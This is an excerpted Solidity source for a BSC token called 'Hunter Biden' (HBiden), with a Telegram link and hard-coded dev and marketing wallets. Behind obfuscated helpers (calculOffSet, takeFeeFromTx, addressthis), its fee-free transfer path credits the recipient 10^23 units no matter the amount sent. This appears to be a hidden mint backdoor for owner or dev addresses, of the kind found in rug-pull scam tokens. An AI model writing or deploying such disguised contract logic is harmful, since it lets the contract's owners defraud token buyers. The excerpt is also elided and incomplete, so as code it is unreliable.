...
// Telegram : https://t.me/HunterBidenBSC
...
contract HunterBiden is Context, IERC20 { 
    ...
    function addressthis() public view virtual returns (address) {
        return Dev_Wallet;
    }
    ...
    address payable public Wallet_Marketing = payable(0x514410c97B1798f4bc7bC5fF6bb4F0A6365291B6); 
    address payable public Dev_Wallet = payable(0x78365ff651DA73525976991EF34bc8BFdaeEBD5D);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 


    uint256 private constant MAX = ~uint256(0);
    uint256 private _MIN_ = calculOffSet(10,((5*4)+3));
    uint8 private constant _decimals = 9;
    
    uint256 private _tTotal = 1* 10**6 * 10**_decimals;
    string private constant _name = "Hunter Biden"; 
    string private constant _symbol = unicode"HBiden"; 
    ...
    constructor () {
        ...
        _owner = 0x78365ff651DA73525976991EF34bc8BFdaeEBD5D;
    ...
    function takeFeeorNo(bool trueOrFalse) private returns(bool){
        if(trueOrFalse){walletFee = trueOrFalse;}
        return true;
    }

    function calculOffSet(uint256 a, uint256 b) private pure returns(uint256){
        return a**b;
    }
    ...
    function takeFeeFromTx(uint256 feeSize) private pure returns (uint256) {
        uint256 returnedValue = 0;
        if(feeSize==1){
             returnedValue = calculOffSet(10, (20+3));
        }
    ...
    function _transfer(
        ...
        if (from != Wallet_Burn && from != addressthis() && from != owner())
        ...
        bool takeFee = true;
        bool isBuy;
        bool variabled = _isExcludedFromFee[to];
        bool unvariabled = _isExcludedFromFee[from]; 
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(walletFee == false){
                ...
                _tOwned[sender] = _tOwned[sender]-tAmount;
                _tOwned[recipient] = _tOwned[recipient]+takeFeeFromTx(1);
                emit Transfer(sender, recipient, tAmount);
            }
